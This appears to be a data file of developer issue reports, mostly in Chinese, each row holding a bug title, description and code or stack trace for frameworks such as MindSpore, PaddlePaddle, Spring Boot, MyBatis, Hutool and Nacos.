[MS][DUMP]910 环境下model_zoo yolov4-darknet53 网络模型单卡训练，对顶层cell设置set_dump，dump下来的数据缺少AddN算子,"/ 硬件环境: /device ascend : -- MindSpore version :''[sha1]:3fa86724,[branch]:(HEAD-&gt;master,origin/master,origin/HEAD)' -- Python version ::Python 3.7.6 -- OS platform and distribution :eulerosv2r8 -- GCC/Compiler version : (/): /mode pynative /mode graph test_ms_precision_optimization_yolov4_top_cell_set_dump_0020.py 从models仓复制 yolov4-darknet53 网络脚本 向网络脚本插入set_dump代码，对顶层cell设置set_dump，开启dump功能，dump_mode设置为2 执行整网训练脚本 训练成功 成功dump所有算子的数据 dump下来的数据，缺少AddNd的相关算子   <code>: AddN.Gradients_Default_network-YoloWithLossCell_loss_big-YoloLossBlock_AddN-op2960 AddN.Gradients_Default_network-YoloWithLossCell_loss_big-YoloLossBlock_AddN-op2982 AddN.Gradients_Default_network-YoloWithLossCell_loss_big-YoloLossBlock_confidence_loss-ConfidenceLoss_AddN-op2996 AddN.Gradients_Default_network-YoloWithLossCell_loss_big-YoloLossBlock_giou-Giou_AddN-op2914 AddN.Gradients_Default_network-YoloWithLossCell_loss_big-YoloLossBlock_giou-Giou_AddN-op2917 AddN.Gradients_Default_network-YoloWithLossCell_loss_big-YoloLossBlock_giou-Giou_AddN-op2944 AddN.Gradients_Default_network-YoloWithLossCell_loss_me-YoloLossBlock_AddN-op3167 AddN.Gradients_Default_network-YoloWithLossCell_loss_me-YoloLossBlock_AddN-op3189 AddN.Gradients_Default_network-YoloWithLossCell_loss_me-YoloLossBlock_confidence_loss-ConfidenceLoss_AddN-op3203 AddN.Gradients_Default_network-YoloWithLossCell_loss_me-YoloLossBlock_giou-Giou_AddN-op3121 AddN.Gradients_Default_network-YoloWithLossCell_loss_me-YoloLossBlock_giou-Giou_AddN-op3124 AddN.Gradients_Default_network-YoloWithLossCell_loss_me-YoloLossBlock_giou-Giou_AddN-op3151 AddN.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_AddN-op3389 AddN.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_AddN-op3411 AddN.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_confidence_loss-ConfidenceLoss_AddN-op3425 AddN.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_AddN-op3343 AddN.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_AddN-op3346 AddN.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_AddN-op3373 AddN.Gradients_Default_network-YoloWithLossCell_yolo_network-YOLOV4CspDarkNet53_detect_1-DetectionBlock_AddN-op3000 AddN.Gradients_Default_network-YoloWithLossCell_yolo_network-YOLOV4CspDarkNet53_detect_2-DetectionBlock_AddN-op3207 AddN.Gradients_Default_network-YoloWithLossCell_yolo_network-YOLOV4CspDarkNet53_detect_3-DetectionBlock_AddN-op3429 AddN.Gradients_Default_network-YoloWithLossCell_yolo_network-YOLOV4CspDarkNet53_feature_map-YOLOv4_backblock0-YoloBlock_conv4-SequentialCell_2-LeakyReLU_AddN-op3615 AddN.Gradients_Default_network-YoloWithLossCell_yolo_network-YOLOV4CspDarkNet53_feature_map-YOLOv4_backblock1-YoloBlock_conv4-SequentialCell_1-BatchNorm2d_AddN-op4418"
got attribute error for this line,https://github.com/PaddlePaddle/Paddle/blob/2194ad1566464eb7bc8eb4d5bf6b791379a3a145/tools/timeline.py#L243 在nvidia gpu开发机上获得profile文件后运行 时在这一行会报Attribute Error。注释该行后可正常运行并获得timeline文件。   <code>: python timeline.py --profile_path=profile --timeline_path=timeline
springboot集成后SQLManagerCustomize自定义setDbStyle后空指针异常,"异常为： 版本为：3.5.1-RELEASE 异常出现在Mapper调用分页查询时！   <code>: @Bean public SQLManagerCustomize mySQLManagerCustomize(){ return new SQLManagerCustomize(){ @Override public void customize(String sqlMangerName, SQLManager manager) { manager.setDbStyle(new MySqlStyle()); } }; } java.lang.NullPointerException at org.beetl.sql.core.db.AbstractDBStyle.appendExpress(AbstractDBStyle.java:486) at org.beetl.sql.core.db.AbstractDBStyle.getOrderBy(AbstractDBStyle.java:482) at org.beetl.sql.core.range.OffsetLimitRange.toTemplateRange(OffsetLimitRange.java:29) at org.beetl.sql.core.SQLManager.getPageSqlScript(SQLManager.java:359) at org.beetl.sql.core.SQLManager.pageQuery(SQLManager.java:450) at org.beetl.sql.mapper.identity.PageRMI.call(PageRMI.java:25) at org.beetl.sql.mapper.MapperJavaProxy.invoke(MapperJavaProxy.java:140) at org.beetl.sql.mapper.MapperJava8Proxy.invoke(MapperJava8Proxy.java:90) at com.sun.proxy.$Proxy242.vovaOrderPageQuery(Unknown Source) at com.elstgl.enterprise.erp.portal.vova.service.VovaOrderService.page(VovaOrderService.java:59)"
模型训练出错，内存超限Check failed: posix_memalign(,"加载的词典有5000多万行，layer类型为paddle.data_type.integer_value_sequence(self.vocab_sizes[0]))，当使用小量词典时，模型训练正常，但是当使用5000多万行的词典时就出了，有什么解决方案吗？无论单机还是mpi，都是一样的错误   <code>: I0921 13:59:56.989329 32240 Util.cpp:166] commandline: --use_gpu=False --trainer_count=1 [WARNING 2017-09-21 14:07:54,033 unit_vec.py:76] build DSSM model with config of rank, cnn [INFO 2017-09-21 14:07:54,033 unit_vec.py:77] vocabulary sizes: [55564254, 55564254] [INFO 2017-09-21 14:07:54,033 unit_vec.py:207] build rank model [INFO 2017-09-21 14:07:54,035 unit_vec.py:110] create embedding table [_] which dimention is 2048 [INFO 2017-09-21 14:07:54,036 unit_vec.py:110] create embedding table [_] which dimention is 2048 [INFO 2017-09-21 14:07:54,037 unit_vec.py:110] create embedding table [_] which dimention is 2048 [INFO 2017-09-21 14:07:54,038 unit_vec.py:163] create a sequence_conv_pool which context width is 3 [INFO 2017-09-21 14:07:54,041 unit_vec.py:165] create a sequence_conv_pool which context width is 4 [INFO 2017-09-21 14:07:54,044 unit_vec.py:177] create fc layer [__fc_0_1024] which dimention is 1024 [INFO 2017-09-21 14:07:54,045 unit_vec.py:177] create fc layer [__fc_1_512] which dimention is 512 [INFO 2017-09-21 14:07:54,046 unit_vec.py:177] create fc layer [__fc_2_256] which dimention is 256 [INFO 2017-09-21 14:07:54,047 unit_vec.py:163] create a sequence_conv_pool which context width is 3 [INFO 2017-09-21 14:07:54,049 unit_vec.py:165] create a sequence_conv_pool which context width is 4 [INFO 2017-09-21 14:07:54,051 unit_vec.py:177] create fc layer [__fc_0_1024] which dimention is 1024 [INFO 2017-09-21 14:07:54,052 unit_vec.py:177] create fc layer [__fc_1_512] which dimention is 512 [INFO 2017-09-21 14:07:54,053 unit_vec.py:177] create fc layer [__fc_2_256] which dimention is 256 [INFO 2017-09-21 14:07:54,054 unit_vec.py:163] create a sequence_conv_pool which context width is 3 [INFO 2017-09-21 14:07:54,056 unit_vec.py:165] create a sequence_conv_pool which context width is 4 [INFO 2017-09-21 14:07:54,059 unit_vec.py:177] create fc layer [__fc_0_1024] which dimention is 1024 [INFO 2017-09-21 14:07:54,060 unit_vec.py:177] create fc layer [__fc_1_512] which dimention is 512 [INFO 2017-09-21 14:07:54,061 unit_vec.py:177] create fc layer [__fc_2_256] which dimention is 256 F0921 14:07:54.075613 32240 Allocator.h:51] Check failed: posix_memalign(&amp;ptr, 32ul, size) == 0 (12 vs. 0) *** Check failure stack trace: *** @ 0x7f5fcbe92e6d google::LogMessage::Fail() @ 0x7f5fcbe9691c google::LogMessage::SendToLog() @ 0x7f5fcbe92993 google::LogMessage::Flush() @ 0x7f5fcbe97e2e google::LogMessageFatal::~LogMessageFatal() @ 0x7f5fcbe00d58 paddle::CpuAllocator::alloc() @ 0x7f5fcbdffc66 paddle::PoolAllocator::alloc() @ 0x7f5fcbdfeae6 paddle::CpuMemoryHandle::CpuMemoryHandle() @ 0x7f5fcbdd480e paddle::CpuVectorT&lt;&gt;::CpuVectorT() @ 0x7f5fcbdd4cca paddle::VectorT&lt;&gt;::create() @ 0x7f5fcbdd4de9 paddle::VectorT&lt;&gt;::createParallelVector() @ 0x7f5fcbcdd1b6 paddle::Parameter::enableType() @ 0x7f5fcbcf66fc paddle::parameterInitNN() @ 0x7f5fcbcf8df9 paddle::NeuralNetwork::init() @ 0x7f5fcbcf576b paddle::GradientMachine::create() @ 0x7f5fcbe6efb8 GradientMachine::createFromPaddleModelPtr() @ 0x7f5fcbe6f17f GradientMachine::createByConfigProtoStr() @ 0x7f5fcbb81ada _wrap_GradientMachine_createByConfigProtoStr @ 0x4a9e33 PyEval_EvalFrameEx @ 0x4ad70d PyEval_EvalCodeEx @ 0x4aa88c PyEval_EvalFrameEx @ 0x4ad70d PyEval_EvalCodeEx @ 0x4aa88c PyEval_EvalFrameEx @ 0x4ad70d PyEval_EvalCodeEx @ 0x51c2c5 function_call @ 0x4243c3 PyObject_Call @ 0x427b3d instancemethod_call @ 0x4243c3 PyObject_Call @ 0x47989f slot_tp_init @ 0x47615f type_call @ 0x4243c3 PyObject_Call @ 0x4a79f6 PyEval_EvalFrameEx @ 0x4ad70d PyEval_EvalCodeEx Aborted (core dumped)"
gradle springboot 子模块扫描无法获取类 . ClassScaner.java,"gradle springboot 打包jar 打包命令 gradle build springboot项目 启动构建好的jar: java -jar build/lib/myproject.jar 如果扫描子模块将无法查找到. 在IDEA开发中是没有该问题. 扫描子模块 . 无法找到类. ClassScaner.java   <code>: 2017-06-28 18:51:30.682 INFO 69092 --- [pool-3-thread-1] c.i.c.c.RegionCacheMappingScanConfig : 开始扫描包: com.iohao.card.service /Users/kk59/git/mywork/card/build/libs/card-1.0-SNAPSHOT.jar!/BOOT-INF/lib/service-1.0-SNAPSHOT.jar (No such file or directory) java.io.FileNotFoundException: /Users/kk59/git/mywork/card/build/libs/card-1.0-SNAPSHOT.jar!/BOOT-INF/lib/service-1.0-SNAPSHOT.jar (No such file or directory) at java.util.zip.ZipFile.open(Native Method) at java.util.zip.ZipFile.&lt;init&gt;(ZipFile.java:219) at java.util.zip.ZipFile.&lt;init&gt;(ZipFile.java:149) at java.util.jar.JarFile.&lt;init&gt;(JarFile.java:166) at java.util.jar.JarFile.&lt;init&gt;(JarFile.java:130) at com.xiaoleilu.hutool.lang.ClassScaner.processJarFile(ClassScaner.java:228) at com.xiaoleilu.hutool.lang.ClassScaner.fillClasses(ClassScaner.java:150) at com.xiaoleilu.hutool.lang.ClassScaner.scanPackage(ClassScaner.java:104) at com.xiaoleilu.hutool.util.ClassUtil.scanPackage(ClassUtil.java:109) at com.iohao.core.config.RegionCacheMappingScanConfig.scan(RegionCacheMappingScanConfig.java:76) private void scan(String packName) { log.info("" 开始扫描包: {} "", packName); Filter&lt;Class&lt;?&gt;&gt; classFilter = clz -&gt; RegionCacheService.class.isAssignableFrom(clz); Set&lt;Class&lt;?&gt;&gt; classSet = ClassUtil.scanPackage(packName, classFilter); log.info(""classSet : {}"", classSet); log.info(""classSet.size : {}"", classSet.size()); classSet.forEach(cacheServices::add); }"
mybatis语法解析有误,"版本: 1.6.1 create.sql api脚本 目前会解析为 期望:   <code>: create table test_data ( id bigint not null primary key auto_increment, name varchar(100) null ); insert into test_data values (1, '1'); insert into test_data values (2, '2'); var sql = """""" select * from test_data &lt;where&gt; &lt;if test='id != null'&gt; and id = #{id} &lt;/if&gt; &lt;/where&gt; """""" return db.select(sql) select * from test_data WHERE select * from test_data"
拦截器报空指针异常,"实现层： DAO： XML：   <code>: @Override public Page&lt;HqtCompanyJobVO&gt; selectBatchJobDetails(List&lt;Long&gt; idList, HqtPage hqtPage) { Page&lt;HqtCompanyJobVO&gt; page = new Page&lt;HqtCompanyJobVO&gt;(hqtPage.getCurrent(), hqtPage.getSize()); List&lt;HqtCompanyJobVO&gt; selectBatchJobDetails = hqtCompanyJobMapper.selectBatchJobDetails(idList,page); page.setRecords(selectBatchJobDetails); return page; } List&lt;HqtCompanyJobVO&gt; selectBatchJobDetails(@Param(""idList"")List&lt;Long&gt; idList, Page&lt;HqtCompanyJobVO&gt; page); &lt;select id=""selectBatchJobDetails"" resultType=""hqtCompanyJobVO""&gt; SELECT cj.`keyname`, cj.`recruitnum`, cj.`education`, cj.`monthly`, cj.`property`, cj.`label`, city.`uname` FROM hqt_company_job cj LEFT JOIN hqt_district_info city ON cj.`city_diid` = city.`diid` WHERE cj.cjid in &lt;foreach collection=""idList"" item=""cjid"" open=""("" close="")"" separator="","" index=""index""&gt; #{cjid} &lt;/foreach&gt; &lt;/select&gt;"
4.2.0 feign list返回值问题,"4.2.0版本,调用list方法,返回值怎么是map 调用方法(继承了) 部分返回值(postman) 调用feignclient 调用来源端出现此错误   <code>: DataEntity List&lt;Truefirealarm&gt; findList(Truefirealarm truefirealarm); { ""truefirealarm"": { ""isNewRecord"": true, ""status"": ""0"" }, ""dataEntityList"": [ { ""id"": ""1324233653376700416"", ""isNewRecord"": false, ""mergeCode"": ""1324233653376700416"", ""receiveTime"": ""2020-11-05 14:14:40"", ""fireStarttime"": ""2020-11-05 14:14:40"" } ] } Wrapped by org.springframework.web.client.RestClientException: Error while extracting response for type [java.util.List&lt;com.cfs.modules.policefault.entity.Truefirealarm&gt;] and content type [application/json;charset=UTF-8]; nested exception is org.springframework.http.converter.HttpMessageNotReadableException: JSON parse error: Cannot deserialize instance of `java.util.ArrayList` out of START_OBJECT token; nested exception is com.fasterxml.jackson.databind.exc.MismatchedInputException: Cannot deserialize instance of `java.util.ArrayList` out of START_OBJECT token at [Source: (PushbackInputStream); line: 1, column: 1]"
tabs需求,"作者你好，我想请问一下。像这种写法的tabs。想要在内容1里实现像elementUI这种组件引用。是否可行。   <code>: &lt;div class=""layui-tab""&gt; &lt;ul class=""layui-tab-title""&gt; &lt;li class=""layui-this""&gt;网站设置&lt;/li&gt; &lt;li&gt;用户管理&lt;/li&gt; &lt;li&gt;权限分配&lt;/li&gt; &lt;li&gt;商品管理&lt;/li&gt; &lt;li&gt;订单管理&lt;/li&gt; &lt;/ul&gt; &lt;div class=""layui-tab-content""&gt; &lt;div class=""layui-tab-item layui-show""&gt;内容1&lt;/div&gt; &lt;div class=""layui-tab-item""&gt;内容2&lt;/div&gt; &lt;div class=""layui-tab-item""&gt;内容3&lt;/div&gt; &lt;div class=""layui-tab-item""&gt;内容4&lt;/div&gt; &lt;div class=""layui-tab-item""&gt;内容5&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script&gt; //注意：选项卡 依赖 element 模块，否则无法进行功能性操作 layui.use('element', function(){ var element = layui.element; //… }); &lt;/script&gt;"
JSONObject putByPath,"所选行报错 java.lang.NullPointerException: [Assertion failed] - this argument is required; it must not be null 建议: 如果Path最后一个属性不存在, 应该根据后面的值去创建一个,当Path最后一个属性存在时创建JSONArray, 否则创建JSONObject.   <code>: at cn.hutool.core.lang.Assert.notNull(Assert.java:132) at cn.hutool.core.lang.Assert.notNull(Assert.java:150) at cn.hutool.core.util.ReflectUtil.setFieldValue(ReflectUtil.java:221) at cn.hutool.core.util.ReflectUtil.setFieldValue(ReflectUtil.java:208) at cn.hutool.core.bean.BeanUtil.setFieldValue(BeanUtil.java:233) at cn.hutool.core.bean.BeanPath.set(BeanPath.java:107) at cn.hutool.json.JSONObject.putByPath(JSONObject.java:428) [x]"
"[CT][MS][generate]net with Div in ctrl, load mindir infer fail on Ascend","控制流网络，正向，导出mindir，执行正常。Ascend后端导入，推理报错 / 硬件环境: /device ascend : -- MindSpore version :40015e00 master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph python test_ctrl10.py load infer ok RuntimeError: mindspore/ccsrc/backend/common/session/ascend_auto_monad.cc:582 HandleCallReturn] call_site node: kernel_graph_0:1238{[0]: ValueNode Switch, [1]: 1230, [2]: [CNode]1233, [3]: [CNode]1236} has different abstract() with kernel_graph_34 output(), [ AbstractTensor(shape: (), element: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape), value_ptr: 0x2713d9d0, value: AnyValue) != AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape) ],Do not support this situation, pls check if the graghs are correct. GPU, CPU 执行正常   <code>: from mindspore.nn import Cell, GraphCell from mindspore.common import Tensor, dtype from mindspore.train.serialization import export, load import mindspore.ops.functional as F class Net(Cell): def construct(self, x): if (x &gt;= 3): for i in range(2): x = (x / 2) x = (x * 2) if (x &lt;= 3): pass x = (x + 1) if (x &gt; 2): for i in range(2): x = (x - 2) if (x == 1): break x = (x * 3) if (x &gt; 4): x = (x - 1) x = (x - 2) x = (x - 3) elif (x != 3): x = (x + 2) elif (x &gt; 4): x = (x - 3) elif (x &gt;= 2): x = (x / 3) elif (x == 3): if (x == 4): x = (x - 1) x = (x * 1) elif (x &lt; 3): x = (x * 1) else: x = (x + 3) elif (x != 1): x = (x / 3) elif (x &gt;= 4): x = (x + 1) elif (x != 3): x = (x / 1) elif (x &gt; 3): for i in range(2): x = (x * 2) x = (x - 3) x = (x - 3) if (x &lt;= 3): continue else: for i in range(2): if (x != 3): x = (x + 3) x = (x * 3) elif (x &gt; 3): x = (x * 2) elif (x &lt;= 4): x = (x + 2) elif (x == 2): x = (x + 3) x = (x - 3) if (x &lt;= 2): pass return x net = Net() x = Tensor(-2, dtype.float32) out = net(x) print(out) export(net, x, file_name='ctrl', file_format='MINDIR') print('export ok') graph = load('ctrl.mindir') gnet = GraphCell(graph) gout = gnet(x) print(gout) print('load infer ok')"
[CT][MS][OCCM][listdiff]算子gpu 报  AssertionError,"算子在GPU后端运行用例 出现AssertionError def test_p_listdiff_int64_1m(): np.random.seed(1024) x = Tensor(np.random.uniform(-100, 100, [1024 * 1024]), mstype.int64) y = Tensor(np.random.uniform(-100, 100, [1024 * 128]), mstype.int64) fact = ListDiffMock(inputs=[x, y]) test_listdiff.py:252: ../share/ops/primitive/listdiff_ops.py:80: in forward_cmp allclose_nparray(out_tf, out_mindspore, self.loss, self.loss) data_expected = array([], dtype=int64), data_me = array([0], dtype=int64), rtol = 0, atol = 0, equal_nan = True E AssertionError ../share/utils.py:33: AssertionError /mode graph   <code>: fact.forward_cmp() def allclose_nparray(data_expected, data_me, rtol, atol, equal_nan=True): if np.any(np.isnan(data_expected)) or np.any(np.isnan(data_me)): assert np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan) elif not np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan): _count_unequal_element(data_expected, data_me, rtol, atol) else: assert np.array(data_expected).shape == np.array(data_me).shape"
文件上传不支持多文件,"但是swagger ui上面的文件表单域不支持多文件。   <code>: */ @PostMapping(value = ""save"", consumes = MediaType.MULTIPART_FORM_DATA_VALUE) @ApiImplicitParam(name = ""files"",allowMultiple = true, dataType = ""MultipartFile"") @ApiOperation(value = ""意见反馈"", notes = ""需要在header中加入Authentication"") public Response&lt;Void&gt; save(FeedbackSaveVO feedbackSaveVO, List&lt;MultipartFile&gt; files) { return feedbackService.save(feedbackSaveVO,files) &gt;= 1 ? ResponseUtil.success(null) : ResponseUtil.fail(null); }"
feed data格式错误,"照着demo改的，但是run一直出错   <code>: def train(): def train_reader(): train_x = [[1, 2], [1, 4], [3, 4], [5,4]] train_y = [[1,2], [2,3], [4,5], [8,9]] train_z = [1, 0, 0, 0, 1] def reader(): for i in xrange(4): yield train_x[i],train_z[i] return reader tmp = train_reader() for i in tmp(): print i paddle.init(use_gpu=with_gpu, trainer_count=3) ## query part query_id = paddle.layer.data( name='query_id', type=paddle.data_type.integer_value_sequence(13)) query_emb = paddle.layer.embedding(input=query_id, size=12) ## label part click = paddle.layer.data(name='label', type=paddle.data_type.integer_value(2)) ## label inference = paddle.layer.fc(input=query_emb, size=2, act=paddle.activation.Softmax()) ## cost cost = paddle.layer.classification_cost( input=inference, label=click) params = paddle.parameters.create(cost) optimizer = paddle.optimizer.AdaGrad() trainer = paddle.trainer.SGD( cost=cost, parameters=params, update_equation=optimizer) def __event_handler__(event): if isinstance(event, paddle.event.EndIteration): pass feeding_index = {'query_id':0, 'label':1} print feeding_index trainer.train(reader=train_reader(), feeding=feeding_index, event_handler=__event_handler__, num_passes=1) train() ([1, 2], 1) ([1, 4], 0) ([3, 4], 0) ([5, 4], 0) I0921 17:29:05.504608 29439 Util.cpp:166] commandline: --use_gpu=False --trainer_count=3 I0921 17:29:05.512742 29439 GradientMachine.cpp:85] Initing parameters.. I0921 17:29:05.512795 29439 GradientMachine.cpp:92] Init parameters done. {'query_id': 0, 'label': 1} Traceback (most recent call last): File ""train.py"", line 64, in &lt;module&gt; train() File ""train.py"", line 62, in train num_passes=1) File ""/home/work/wangdong/paddlev2/python27/lib/python2.7/site-packages/paddle/v2/trainer.py"", line 153, in train in_args = feeder(data_batch) File ""/home/work/wangdong/paddlev2/python27/lib/python2.7/site-packages/py_paddle/dataprovider_converter.py"", line 278, in __call__ return self.convert(dat, argument) File ""/home/work/wangdong/paddlev2/python27/lib/python2.7/site-packages/paddle/v2/data_feeder.py"", line 134, in convert return DataProviderConverter.convert(self, reorder_data(dat), argument) File ""/home/work/wangdong/paddlev2/python27/lib/python2.7/site-packages/paddle/v2/data_feeder.py"", line 130, in reorder_data reorder.append(each[self.feeding[name]]) TypeError: 'int' object has no attribute '__getitem__'"
Error querying database.  Cause: java.lang.NullPointerException,"您好，我在使用Spring boot 2集成PageHelper时出现如下错误： 依赖引用如下： 调用代码如下：   <code>: org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.exceptions.PersistenceException: ### Error querying database. Cause: java.lang.NullPointerException ### Cause: java.lang.NullPointerException &lt;dependency&gt; &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt; &lt;artifactId&gt;pagehelper-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.2.9&lt;/version&gt; &lt;/dependency&gt; public List&lt;T&gt; findPage(T entity) { startPage(); return dao.findList(entity); } protected void startPage() { PageContext pageCtx = PageContext.currentContext(); String orderBy = pageCtx.getOrderBy(); if (StringUtils.isEmpty(orderBy)) { PageHelper.startPage(pageCtx.getPageNum(), pageCtx.getPageSize()); } else { PageHelper.startPage(pageCtx.getPageNum(), pageCtx.getPageSize(), orderBy); } }"
【众智】【计算-GPU开发】IdentityN,"返回与输入具有相同形状和内容的张量列表。 接口目录：mindspore/ops/operation/array_ops.py x tuple(Tensor) or List(Tensor) y tuple(Tensor) or List(Tensor) 对应底层算子 对应底层AICPU算子IdentityN 标杆接口参考 TF接口： https://www.tensorflow.org/versions/r2.3/api_docs/python/tf/raw_ops/IdentityN tf.raw_ops.IdentityN(input, name=None) 3. 异常处理 4. 算子反向 直接返回dout 参考TF算子IdentityN的反向 tensorflow\python\ops\array_grad.py @ops.RegisterGradient(""IdentityN"")   <code>: class IdentityN(Primitive): REG_OP(IdentityN) .DYNAMIC_INPUT(x, TensorType({DT_FLOAT, DT_FLOAT16, DT_INT8, DT_INT16, DT_UINT16, DT_UINT8, DT_INT32, DT_INT64, DT_UINT32, DT_UINT64, DT_BOOL, DT_DOUBLE})) .DYNAMIC_OUTPUT(y, TensorType({DT_FLOAT, DT_FLOAT16, DT_INT8, DT_INT16, DT_UINT16, DT_UINT8, DT_INT32, DT_INT64, DT_UINT32, DT_UINT64, DT_BOOL, DT_DOUBLE})) .OP_END_FACTORY_REG(IdentityN)"
Jsonutil对泛型的转换报错,"使用的JDK版本和Hutool版本 JDK1.8 hutool 4.5.5 at com.uyun.tenant.Test.main(Test.java:29)   <code>: public class ResultDto&lt;T&gt; implements Serializable { private static final long serialVersionUID = -1417999729205654379L; /** * 成功码. */ public static final int SUCCESS_CODE = 200; /** * 成功信息. */ public static final String SUCCESS_MESSAGE = ""操作成功""; /** * 错误码. */ public static final int ERROR_CODE = 500; /** * 错误信息. */ public static final String ERROR_MESSAGE = ""内部异常""; /** * 错误码：参数非法 */ public static final int ILLEGAL_ARGUMENT_CODE_ = 100; /** * 错误信息：参数非法 */ public static final String ILLEGAL_ARGUMENT_MESSAGE = ""参数非法""; /** * 编号. */ private int code; /** * 信息. */ private String message; /** * 结果数据 */ private T result; /** * Instantiates a new wrapper. default code=200 */ public ResultDto() { this(SUCCESS_CODE, SUCCESS_MESSAGE); } /** * Instantiates a new wrapper. * * @param code the code * @param message the message */ public ResultDto(int code, String message) { this(code, message, null); } /** * Instantiates a new wrapper. * * @param code the code * @param message the message * @param result the result */ ResultDto(int code, String message, T result) { super(); this.code(code).message(message).result(result); } /** * Sets the 编号 , 返回自身的引用. * * @param code the new 编号 * @return the wrapper */ private ResultDto&lt;T&gt; code(int code) { this.setCode(code); return this; } /** * Sets the 信息 , 返回自身的引用. * * @param message the new 信息 * @return the wrapper */ private ResultDto&lt;T&gt; message(String message) { this.setMessage(message); return this; } /** * Sets the 结果数据 , 返回自身的引用. * * @param result the new 结果数据 * @return the wrapper */ public ResultDto&lt;T&gt; result(T result) { this.setResult(result); return this; } /** * 判断是否成功： 依据 ResultDto.SUCCESS_CODE == this.code * * @return code =200,true;否则 false. */ @JsonIgnore public boolean success() { return ResultDto.SUCCESS_CODE == this.code; } /** * 判断是否成功： 依据 ResultDto.SUCCESS_CODE != this.code * * @return code !=200,true;否则 false. */ @JsonIgnore public boolean error() { return !success(); } public int getCode() { return code; } public void setCode(int code) { this.code = code; } public String getMessage() { return message; } public void setMessage(String message) { this.message = message; } public T getResult() { return result; } public void setResult(T result) { this.result = result; } }"
BigExcelWriter 创建的文件 ExcelUtil无法读取内容,"JDK版本： openjdk_8_201 hutool版本： 5.X.X 对execl文件内容进行替换操作之后输出的xlsx文件,无法使用execlUtil读取内容. 使用execl开保存后恢复正常. 配置文件内容 #sourcePath=d://source.xlsx targetPath=d:/output/ outPath=d:/output/out/   <code>: static Props prop = Props.getProp(""execl.properties""); public static void main(String[] args) { String targetPath = prop.getStr(""targetPath""); File directory = FileUtil.file(targetPath); if (!directory.isDirectory()) { StaticLog.info(""directory={}"", directory.getPath()); return; } // 清空输出目录 String outPath = prop.getStr(""outPath""); FileUtil.del(outPath); // 遍历目标目录,进行操作 File[] files = directory.listFiles(); for (File file : files) { if (file.isFile()) { TimeInterval timer = DateUtil.timer(); StaticLog.info(""开始处理文件:{}"", file.getAbsolutePath()); modifiedFile(file); StaticLog.info(""处理完成文件:{},use times = {} ms"", file.getAbsolutePath(), timer.interval()); } } } public static void modifiedFile(File file) { String path = file.getPath(); // StaticLog.info(""file={}"", file.getPath()); // StaticLog.info(""targetPath={}"", prop.getStr(""targetPath"")); // StaticLog.info(""outPath={}"", prop.getStr(""outPath"")); String newFile = prop.getStr(""outPath"") + file.getName(); // StaticLog.info(""newFile={}"", newFile); List&lt;Object&gt; data = new ArrayList&lt;&gt;(); BigExcelWriter writer = ExcelUtil.getBigWriter(newFile); ExcelUtil.readBySax(path, 0, replaceHandler(data)); writer.write(data); StaticLog.info(""文件写入中,请稍候!""); writer.close(); StaticLog.info(""文件写入完成!""); } private static RowHandler replaceHandler(List&lt;Object&gt; data) { return new RowHandler() { public void handle(int sheetIndex, int rowIndex, List&lt;Object&gt; rowlist) { TimeInterval timer = DateUtil.timer(); for (int i = 0; i &lt; rowlist.size(); i++) { Object temp = rowlist.get(i); String result = temp.toString(); Segment segment = HanLP.newSegment().enableNameRecognize(true); List&lt;Term&gt; termList = segment.seg(result); StringBuilder builder = new StringBuilder(); for (Term term : termList) { if (term.nature == Nature.nr) { List&lt;Pinyin&gt; pyList = HanLP.convertToPinyinList(term.word); String pyStr = """"; for (Pinyin py : pyList) { pyStr += (py.getFirstChar() + """").toUpperCase(); } String after = builder.append(""【"").append(pyStr).append(""】"").toString(); StaticLog.info(""after={},before={}"", after, term.word); } else { builder.append(term.word); } } rowlist.set(i, builder.toString()); } data.add(rowlist); // StaticLog.info(""处理完成 {} 行,use times = {} ms"", rowIndex, timer.interval()); } }; }"
Nacos 数据库到本机 IP，与 hosts 配置的不一致,pig版本: 3.0.4（master） 是否修改包名: 否 按照部署文档，修改 hosts 如下（数据库不在本机）： 然后修改了 ： 启动 Nacos，报错信息显示连接的是本机的 IP，但是用户名是配置中的没错，pig-mysql 没有被用到，没有做其他配置为什么会连接到本机的 IP 呢？（切换到 2.6.5 版本也一样） 本机 IP：， 服务器 IP：。   <code>: 192.168.1.3 pig-mysql 192.168.1.3 pig-redis 127.0.0.1 pig-gateway 127.0.0.1 pig-register 127.0.0.1 pig-sentinel 127.0.0.1 pig-monitor pig-register/src/main/resources/bootstrap.yml db: num: 1 user: ${MYSQL-USER:taylor} password: ${MYSQL-PWD:XXXX} url: 0: jdbc:mysql://${MYSQL_HOST:pig-mysql}:${MYSQL_PORT:3306}/${MYSQL_DB:pig_config}?characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=GMT%2B8&amp;nullCatalogMeansCurrent=true&amp;allowPublicKeyRetrieval=true 192.168.1.2 192.168.1.3 org.springframework.jdbc.CannotGetJdbcConnectionException: Failed to obtain JDBC Connection; nested exception is java.sql.SQLException: Access denied for user 'taylor'@'192.168.1.2' (using password: YES) at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:82) at org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:376) at org.springframework.jdbc.core.JdbcTemplate.update(JdbcTemplate.java:558)
